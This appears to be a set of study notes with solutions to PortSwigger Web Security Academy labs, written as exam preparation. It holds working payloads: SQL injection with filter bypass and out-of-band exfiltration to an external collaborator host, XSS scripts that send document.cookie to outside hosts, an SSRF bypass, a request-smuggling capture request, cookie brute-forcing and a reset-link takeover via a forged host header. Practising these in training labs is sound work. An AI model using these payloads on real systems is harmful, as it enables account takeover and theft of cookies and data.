"These labs have been selected because they reinforce core web security testing skills - such as understanding encodings and using them to evade defences, and proficiency in exploiting cross-user attacks. These specific labs support your exam preparation in terms of skill development, but they are in no way a list of the components you'll be expected to solve to complete the exam."

# [0x1] Lab: SQL injection with filter bypass via XML encoding
You will need [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) Burp Suite Extension
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
      <productId>
        2
      </productId>
    <storeId>
      <@hex_entities>
        1 union select password from users where username='administrator' 
      <@/hex_entities>
    </storeId>
  </stockCheck>
```

# [0x2] Lab: Blind SQL injection with out-of-band data exfiltration
### Identify vulnerability:
```sql
aaxaxa'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://x.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual-- 
```
Control + U for URL Encoding and SEND

### Data exfiltration
```sql
'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```
Control + U for URL Encoding and SEND

# [0x3] Lab: Exploiting cross-site scripting to steal cookies 
A simulated victim user views all comments after they are posted.<br>
Write this payload into comment section:
```js
<script> document.location = "http://<BURP-COLLABORATOR>/?" + document.cookie </script>
```

# [0x4] Lab: SSRF with blacklist-based input filter
```
http://127.1/%2561dmin/delete?username=carlos
```

# [0x5] Lab: Exploiting HTTP request smuggling to capture other users' requests

Send this request to repeater and with HTTP Request Smuggler extension CL.TE send the requests a lot of times till the victim user visit our post requests
```
POST / HTTP/1.1
Host: 0ac3003b03f25372c05c3a6500550078.web-security-academy.net
Cookie: session=T4wowDw3zijv7BtCJopH8kzeW8ur458c
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Connection: close
Transfer-Encoding: chunked
Content-Length: 382

0

POST /post/comment HTTP/1.1
Host: 0ac3003b03f25372c05c3a6500550078.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 910
Cookie: session=T4wowDw3zijv7BtCJopH8kzeW8ur458c

csrf=OFh9DBRBkec4d8Xmh2rzVGNUZuDZlbH0&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=aa
```

# [0x6] Lab: Brute-forcing a stay-logged-in cookie
Login in our account `wiener:peter` and enable the option button `Stay logged in`. When successflly login intercept a GET request at `my-account` and a `stay-logged-in` cookie will appear.

Overtake carlos account steps:
- Send request to Intruder
- Menu bar => Payloads => Payload Processing
  - Add Hash:MD5
  - Add prefix:`carlos:`
  - Add Encode:Base64-encode
- Add $$ after = in `stay-logged-in` cookie e.g. `stay-logged-in=$$`
The last step is bruteforce passwords with these [passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords). DONT FORGET TO LOGOUT FROM WIENER ACCOUNT
![image](https://user-images.githubusercontent.com/45040001/193135064-b1b6ab39-ce48-4a14-af92-92a3ed7ba26e.png)

# [0x7] Email Reset User Takeover
Go to 'Forgot you password?' functionality, if you can put a name instead of email put 'carlos' username and intercept the post request.
For the next step we have to open the exploit server and copy the exploit server host, insert 'X-Forwarded-Host' header with exploit server host for value and forward the request.
Our last step is to open the http logs from exploit server and take the reset link with new password functionality

# [0x8] onpopstate XSS cookie retrieve 
You have to encode the payload with hackvertor extension
```
<@burp_urlencode>

<iframe onload="if(!window.flag){this.contentWindow.location='https://portswigger-labs.net/xss/xss.php?x=<body onpopstate=document.location=`http://mi8wmhv2blmszdpoeo30vaj3iuokc9.oastify.com/?`+document.cookie>#';flag=1}" src="https://portswigger-labs.net/xss/xss.php?x=<body onpopstate=document.location=`http://mi8wmhv2blmszdpoeo30vaj3iuokc9.oastify.com/?`+document.cookie>"></iframe>

<@/burp_urlencode>
```
